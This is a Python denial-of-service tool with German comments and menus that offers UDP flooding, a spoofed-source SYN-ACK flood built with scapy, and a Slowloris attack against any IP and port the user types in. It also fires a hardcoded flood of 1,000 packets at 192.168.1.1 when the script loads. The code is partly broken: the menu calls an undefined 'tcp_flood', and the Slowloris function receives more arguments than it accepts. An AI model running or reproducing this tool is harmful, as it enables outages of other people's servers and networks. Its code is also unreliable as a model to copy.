import os
import random
import socket
import threading
import time
import sys

# Globale Variablen
packet_counter = 0
stop_event = threading.Event()

# Banner mit Anpassungsmöglichkeiten
def show_banner(color):
    os.system("clear")
    print(f"{color}")
    print("""
██████╗ ██████╗  ██████╗ ███████╗
██╔══██╗██╔══██╗██╔═══██╗██╔════╝
██████╔╝██████╔╝██║   ██║█████╗  
██╔═══╝ ██╔═══╝ ██║   ██║██╔══╝  
██║     ██║     ╚██████╔╝███████╗
╚═╝     ╚═╝      ╚═════╝ ╚══════╝
    """)
    print("\033[0m")

# UDP Flood
def udp_flood(ip, port, packet_size):
    global packet_counter
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    udp_bytes = random._urandom(packet_size)
    while not stop_event.is_set():
        try:
            sock.sendto(udp_bytes, (ip, port))
            packet_counter += 1
        except:
            pass

# TCP Flood
from scapy.all import *

def syn_ack_flood(target_ip, target_port, packet_count):
    for _ in range(packet_count):
        # Gefälschte Quelle (kann zufällig sein)
        src_ip = RandIP()
        src_port = RandShort()
        
        # SYN-ACK Paket erstellen
        ip_layer = IP(src=src_ip, dst=target_ip)
        tcp_layer = TCP(sport=src_port, dport=target_port, flags='SA')  # SYN-ACK Flags
        packet = ip_layer / tcp_layer
        
        # Paket senden
        send(packet, verbose=False)

# Beispielaufruf
syn_ack_flood("192.168.1.1", 80, 1000)

# Slowloris (TCP Keep-Alive)
def slowloris(ip, port):
    global packet_counter
    sockets = []
    for _ in range(200):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            sock.connect((ip, port))
            sock.send(b"GET / HTTP/1.1\r\n")
            sockets.append(sock)
        except:
            pass
    while not stop_event.is_set():
        for sock in sockets:
            try:
                sock.send(b"X-a: Keep-alive\r\n")
                packet_counter += 1
            except:
                sockets.remove(sock)

# Menü zur Farbauswahl
def choose_color():
    print("1 - Rot")
    print("2 - Grün")
    print("3 - Blau")
    print("4 - Standard")
    choice = input("Wähle eine Farbe: ")
    return {
        "1": "\033[91m",
        "2": "\033[92m",
        "3": "\033[94m",
        "4": "\033[0m",
    }.get(choice, "\033[0m")

# Live-Dashboard
def dashboard():
    global packet_counter
    while not stop_event.is_set():
        print(f"\r[INFO] Gesendete Pakete: {packet_counter}", end="")
        time.sleep(1)

# Hauptprogramm
if __name__ == "__main__":
    color = choose_color()
    show_banner(color)

    while True:
        print("1 - UDP Flood")
        print("2 - TCP Flood")
        print("3 - Slowloris Attack")
        print("4 - Beenden")
        choice = input("Wähle eine Option: ")

        if choice in ["1", "2", "3"]:
            ip = input("Ziel-IP-Adresse: ")
            port = int(input("Ziel-Port: "))
            packet_size = int(input("Paketgröße in Bytes: "))
            num_threads = int(input("Anzahl der Threads: "))

            attack_function = {
                "1": udp_flood,
                "2": tcp_flood,
                "3": slowloris,
            }.get(choice)

            stop_event.clear()
            threads = [
                threading.Thread(target=attack_function, args=(ip, port, packet_size))
                for _ in range(num_threads)
            ]
            for thread in threads:
                thread.daemon = True
                thread.start()

            dashboard_thread = threading.Thread(target=dashboard)
            dashboard_thread.daemon = True
            dashboard_thread.start()

            input("\n[INFO] Drücke ENTER, um den Angriff zu stoppen.\n")
            stop_event.set()

        elif choice == "4":
            print("[INFO] Programm beendet.")
            sys.exit()
